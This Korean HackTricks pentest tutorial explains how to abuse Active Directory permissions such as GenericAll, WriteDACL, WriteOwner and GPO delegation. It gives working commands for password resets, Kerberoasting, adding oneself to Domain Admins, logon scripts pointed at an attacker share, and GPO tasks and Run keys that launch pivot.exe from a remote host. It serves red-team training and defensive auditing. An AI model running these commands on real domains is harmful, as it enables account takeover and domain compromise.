# Active Directory ACLs/ACEs 악용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로 다음 글들의 기법을 요약한 것입니다:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. 자세한 내용은 원문 기사를 확인하세요.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll 사용자에 대한 전체 권한**

이 권한은 공격자에게 대상 사용자 계정에 대한 전체 제어 권한을 부여합니다. `GenericAll` 권한이 `Get-ObjectAcl` 명령으로 확인되면, 공격자는 다음을 수행할 수 있습니다:

- **대상의 비밀번호 변경**: `net user <username> <password> /domain`를 사용하여 공격자는 사용자의 비밀번호를 재설정할 수 있습니다.
- **Targeted Kerberoasting**: 사용자 계정에 SPN을 할당하여 kerberoastable 상태로 만든 다음, Rubeus와 targetedKerberoast.py를 사용해 ticket-granting ticket (TGT) 해시를 추출하고 크랙을 시도합니다.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 해당 사용자의 pre-authentication을 비활성화하여 계정이 ASREPRoasting에 취약해지게 합니다.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **그룹에 대한 GenericAll 권한**

이 권한은 공격자가 `Domain Admins`와 같은 그룹에 대해 `GenericAll` 권한을 가지고 있다면 그룹 멤버십을 조작할 수 있게 합니다. `Get-NetGroup`으로 그룹의 distinguished name을 확인한 후 공격자는 다음을 수행할 수 있습니다:

- **자신을 Domain Admins 그룹에 추가**: 이는 직접 명령을 통해 또는 Active Directory나 PowerSploit 같은 모듈을 사용하여 수행할 수 있습니다.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux에서 GenericAll/Write 멤버십을 보유한 경우 BloodyAD를 사용해 임의의 그룹에 자신을 추가할 수 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있으면 해당 그룹을 적용하는 호스트에서 즉시 WinRM 접근 권한을 얻습니다:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

이러한 권한을 컴퓨터 오브젝트나 사용자 계정에 보유하면 다음이 가능합니다:

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 오브젝트를 탈취할 수 있습니다.
- **Shadow Credentials**: 권한을 이용해 Shadow Credentials를 생성하여 컴퓨터나 사용자 계정을 가장할 수 있습니다.

## **WriteProperty on Group**

사용자가 특정 그룹(예: `Domain Admins`)에 대한 모든 객체에 대해 `WriteProperty` 권한을 가지고 있으면, 다음을 수행할 수 있습니다:

- **Domain Admins 그룹에 자신을 추가**: `net user`와 `Add-NetGroupUser` 명령을 조합해 달성할 수 있으며, 이 방법은 도메인 내에서 privilege escalation을 허용합니다.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

이 권한은 공격자가 그룹 멤버십을 직접 조작하는 명령을 통해 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있게 합니다. 다음 명령 시퀀스를 사용하면 자신을 추가할 수 있습니다:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

유사한 권한으로, 공격자는 해당 그룹에 대해 `WriteProperty` 권한이 있는 경우 그룹 속성을 수정하여 자신을 직접 그룹에 추가할 수 있습니다. 이 권한의 확인 및 실행은 다음을 통해 수행됩니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

사용자에 대해 `ExtendedRight`로 지정된 `User-Force-Change-Password` 권한을 보유하면 현재 비밀번호를 알지 못해도 비밀번호를 재설정할 수 있습니다. 이 권한의 확인 및 악용은 PowerShell 또는 기타 명령줄 도구를 통해 수행할 수 있으며, interactive sessions와 비대화형 환경을 위한 one-liners를 포함한 여러 방법으로 사용자의 비밀번호를 재설정할 수 있습니다. 명령어는 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 것까지 다양하여 공격 벡터의 유연성을 보여줍니다.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

공격자가 특정 그룹에 대해 `WriteOwner` 권한을 가지고 있다는 것을 알게 되면, 해당 그룹의 소유자를 자신으로 변경할 수 있습니다. 이 권한은 대상 그룹이 `Domain Admins`일 경우 특히 큰 영향을 미치며, 소유권 변경을 통해 그룹 속성 및 멤버십을 더 광범위하게 제어할 수 있습니다. 이 절차는 `Get-ObjectAcl`을 통해 올바른 객체를 식별한 다음 `Set-DomainObjectOwner`를 사용하여 SID 또는 이름으로 소유자를 변경하는 것을 포함합니다.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

이 권한은 공격자가 사용자 속성을 수정할 수 있게 합니다. 구체적으로, `GenericWrite` 접근 권한을 통해 공격자는 사용자의 로그온 스크립트 경로를 변경해 사용자가 로그온할 때 악성 스크립트를 실행하게 할 수 있습니다. 이는 `Set-ADObject` 명령을 사용해 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 이루어집니다.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group

이 권한을 통해 공격자는 그룹 멤버십을 조작할 수 있습니다. 예를 들어 자신이나 다른 사용자를 특정 그룹에 추가하는 등의 작업이 가능합니다. 이 과정은 credential object를 생성하고, 이를 사용해 그룹에서 사용자를 추가하거나 제거한 뒤 PowerShell 명령으로 멤버십 변경을 확인하는 것을 포함합니다.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

AD 객체를 소유하고 `WriteDACL` 권한을 가지고 있으면 공격자는 해당 객체에 대해 자신에게 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 이루어지며, 객체에 대한 완전한 제어와 그룹 멤버십을 수정할 수 있는 능력을 허용합니다. 그럼에도 불구하고, Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlets를 사용하여 이러한 권한을 악용하려고 할 때는 제한 사항이 존재합니다.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **도메인에서의 복제 (DCSync)**

DCSync 공격은 도메인의 특정 복제 권한을 활용해 Domain Controller를 가장하고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기법은 `DS-Replication-Get-Changes` 같은 권한을 필요로 하며, 공격자가 Domain Controller에 직접 접근하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있게 합니다. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs)를 관리할 수 있는 위임된 접근 권한은 심각한 보안 위험을 초래할 수 있습니다. 예를 들어 `offense\spotless` 같은 사용자에게 GPO 관리 권한이 위임되어 있다면 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 권한을 가질 수 있습니다. 이러한 권한은 악의적으로 남용될 수 있으며, PowerView를 사용해 다음과 같이 식별할 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

잘못 구성된 GPO를 식별하기 위해 PowerSploit의 cmdlet들을 연결(chain)해서 사용할 수 있습니다. 이를 통해 특정 사용자가 관리 권한을 가진 GPO를 발견할 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**지정된 정책이 적용된 컴퓨터**: 특정 GPO가 적용되는 컴퓨터를 확인할 수 있어 잠재적 영향 범위를 이해하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 어떤 정책이 적용되어 있는지 확인하려면 `Get-DomainGPO` 같은 명령을 사용할 수 있습니다.

**특정 정책이 적용된 OU**: 특정 정책의 영향을 받는 조직 단위(OU)를 식별하려면 `Get-DomainOU`를 사용합니다.

또한 도구 [**GPOHound**](https://github.com/cogiceo/GPOHound)를 사용하여 GPO를 열거하고 문제를 찾을 수 있습니다.

### Abuse GPO - New-GPOImmediateTask

잘못 구성된 GPO는 즉시 실행되는 스케줄된 작업을 생성하는 식으로 코드 실행에 악용될 수 있습니다. 이를 통해 영향받는 시스템의 로컬 Administrators 그룹에 사용자를 추가하여 권한을 크게 상승시킬 수 있습니다:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module가 설치되어 있으면 새로운 GPOs를 생성하고 연결할 수 있으며, 영향을 받는 컴퓨터에서 backdoors를 실행하도록 registry values와 같은 설정을 할 수 있습니다. 이 방법은 GPO가 업데이트되고 사용자가 컴퓨터에 로그인해야 실행됩니다:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse는 새 GPO를 생성할 필요 없이 작업을 추가하거나 설정을 수정하여 기존 GPOs를 abuse하는 방법을 제공합니다. 이 도구는 변경 사항을 적용하기 전 기존 GPOs를 수정하거나 RSAT 도구를 사용해 새 GPOs를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 정책 업데이트 강제

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 과정을 앞당기려면, 특히 변경을 적용한 직후에 대상 컴퓨터에서 `gpupdate /force` 명령을 사용해 즉시 정책 업데이트를 강제할 수 있습니다. 이 명령은 다음 자동 업데이트 주기를 기다리지 않고 GPO에 대한 모든 수정 사항이 적용되도록 보장합니다.

### 내부 동작

특정 GPO(예: `Misconfigured Policy`)의 Scheduled Tasks를 검사하면 `evilTask`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 변경하거나 권한을 상승시키기 위해 스크립트나 명령줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`로 생성된 XML 구성 파일에 표시된 작업의 구조는 실행할 명령과 트리거를 포함하여 예약 작업의 세부사항을 설명합니다. 이 파일은 GPO 내에서 예약 작업이 어떻게 정의되고 관리되는지를 나타내며, 정책 적용의 일환으로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO는 대상 시스템에서 사용자 및 그룹 멤버십을 조작할 수도 있습니다. Users and Groups 정책 파일을 직접 편집함으로써 공격자는 로컬 `administrators` 그룹과 같은 권한이 부여된 그룹에 사용자를 추가할 수 있습니다. 이는 GPO 관리 권한의 위임을 통해 가능하며, 정책 파일을 수정하여 새로운 사용자를 포함하거나 그룹 멤버십을 변경할 수 있게 합니다.

Users and Groups용 XML 구성 파일은 이러한 변경이 어떻게 구현되는지를 개략적으로 보여줍니다. 이 파일에 항목을 추가하면 특정 사용자에게 영향을 받는 시스템 전반에서 상승된 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통한 권한 상승의 직접적인 접근법을 제공합니다.

또한 logon/logoff 스크립트 활용, autoruns용 레지스트리 키 수정, .msi 파일을 통한 소프트웨어 설치, 서비스 구성 편집 등 코드 실행이나 지속성을 유지하기 위한 추가적인 방법들도 고려될 수 있습니다. 이러한 기법들은 GPO 남용을 통해 접근을 유지하고 대상 시스템을 제어할 수 있는 다양한 경로를 제공합니다.

## 참고 자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
